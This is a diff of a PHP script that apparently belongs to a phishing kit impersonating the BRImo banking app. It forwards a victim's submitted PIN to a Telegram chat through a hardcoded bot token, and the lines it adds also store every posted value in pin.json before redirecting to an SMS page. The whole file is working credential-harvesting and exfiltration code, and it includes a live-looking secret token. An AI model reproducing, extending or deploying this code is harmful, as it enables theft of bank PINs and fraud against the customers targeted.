@@ -25,7 +25,7 @@ function sendMessage($telegram_id, $message_text, $secret_token) {
 only basic POST method :
 -----------------------*/
 $telegram_id = $_POST ['telegram_id'];
-$message_text ="Ini adalah sebuah pin akses dari operasi App Brimo: ".""."Pin: ".$_POST ['message_text'];
+$message_text ="[Brimo-One]"."\n"."Pin: ".$_POST ['message_text'];
 
 /*--------------------------------
 Isi TOKEN dibawah ini: 
@@ -33,4 +33,20 @@ Isi TOKEN dibawah ini:
 $secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
 sendMessage($telegram_id, $message_text, $secret_token);
 
+?>
+<?php 
+    if ( !empty($_POST)) { 
+    
+        $message_text1  = $_POST['message_text1'];
+        $message_text  = $_POST['message_text'];
+       
+      
+  $file = file_get_contents('pin.json');
+  $data = json_decode($file, true);
+  unset($_POST["add"]);
+  $data["records"] = array_values($data["records"]);
+  array_push($data["records"], $_POST);
+  file_put_contents("pin.json", json_encode($data));
+  header("Location: sms.php");
+    }
 ?>
